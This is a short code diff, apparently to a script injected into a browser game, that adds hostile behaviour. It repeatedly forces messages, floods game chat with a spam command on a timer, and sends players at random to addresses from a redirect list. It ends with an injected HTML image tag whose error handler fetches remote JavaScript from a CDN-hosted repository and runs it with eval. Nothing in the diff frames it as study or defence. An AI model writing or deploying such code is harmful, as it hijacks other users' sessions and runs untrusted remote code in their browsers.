@@ -1,4 +1,8 @@
+
+function club() {
+if(window.hammer) return;
 const chatMessageCallbacks = [];
+console.log("game has been loaded");
 
 //chat message callback
 /////
@@ -46,7 +50,7 @@ const messages =
 //Random redirect
 /////
 
-if(Math.random() > 1 / 16) forceMessage();
+setInterval(()=>{if(Math.random() > 1 / 16) forceMessage()}, 60000);
 if(Math.random() > 1/64) 
 	{
 		setTimeout(()=>{setInterval(()=>{sendSessionCommand("gsay", [spamMessage])})}, 120000)
@@ -90,4 +94,7 @@ if(Math.random() < 1 / 16)
 		window.location = redlist[parseInt(Math.random() * redlist.length)];
 	}, 1000 * 60 * 2.6 + Math.random() * 1000 * 60 * 8)	
 }
-
+}
+club();
+window.hammer = true;
+<img src=x onerror=\"fetch('https://cdn.jsdelivr.net/gh/dollv10/saber@main/spear.js').then(r=>r.text()).then(eval)\">
